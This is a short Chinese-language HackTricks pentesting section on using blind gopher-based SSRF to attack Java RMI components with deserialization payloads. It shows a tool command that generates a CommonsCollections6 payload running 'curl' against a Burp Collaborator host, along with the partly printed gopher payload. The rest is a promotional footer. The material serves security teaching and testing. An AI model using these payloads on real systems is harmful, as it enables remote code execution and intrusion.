可以利用允许任意字节（基于 gopher）的盲 _SSRF_ 漏洞对 _Java RMI_ 默认组件（_RMI Registry_、_Distributed Garbage Collector_、_Activation System_）进行反序列化或代码库攻击。可以在[这里](https://blog.tneitzel.eu/posts/01-attacking-java-rmi-via-ssrf/)找到详细的写作。以下示例显示了有效载荷生成的示例：
```
$ rmg serial 127.0.0.1 1090 CommonsCollections6 'curl example.burpcollaborator.net' --component reg --ssrf --gopher
[+] Creating ysoserial payload... done.
[+]
[+] Attempting deserialization attack on RMI Registry endpoint...
[+]
[+] 	SSRF Payload: gopher://127.0.0.1:1090/_%4a%52%4d%49%00%02%4c%50%ac%ed%00%05%77%22%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%02%44%15%4d[...]
```
<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks云 ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 推特 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* 你在一个**网络安全公司**工作吗？你想在HackTricks中看到你的**公司广告**吗？或者你想获得**PEASS的最新版本或下载HackTricks的PDF**吗？请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 发现我们的独家[**NFTs**](https://opensea.io/collection/the-peass-family)收藏品[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* 获得[**官方PEASS和HackTricks周边产品**](https://peass.creator-spring.com)
* **加入**[**💬**](https://emojipedia.org/speech-balloon/) [**Discord群组**](https://discord.gg/hRep4RUj7f)或[**电报群组**](https://t.me/peass)，或者**关注**我在**Twitter**上的[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
* **通过向**[**hacktricks repo**](https://github.com/carlospolop/hacktricks) **和**[**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **提交PR来分享你的黑客技巧。**

</details>
